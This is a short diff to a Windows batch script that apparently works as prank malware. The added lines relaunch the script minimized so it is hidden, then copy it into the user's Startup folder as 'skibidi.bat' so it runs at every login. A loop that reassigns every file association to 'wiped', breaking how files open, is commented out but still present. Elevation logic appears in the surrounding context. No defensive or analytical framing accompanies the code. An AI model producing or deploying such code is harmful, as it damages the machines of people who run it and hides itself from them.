@@ -1,3 +1,4 @@
+if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
 if _%1_==_payload_  goto :payload
 
 :getadmin
@@ -9,5 +10,6 @@ if _%1_==_payload_  goto :payload
 goto :eof
 
 :payload
-    for /f "delims==" %%a in ('assoc') do (assoc %%a=wiped & ftype wiped=wiped.bat)
+    copy "%~dpnx0" "C\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\skibidi.bat"
+    REM for /f "delims==" %%a in ('assoc') do (assoc %%a=wiped & ftype wiped=wiped.bat)
 goto :eof
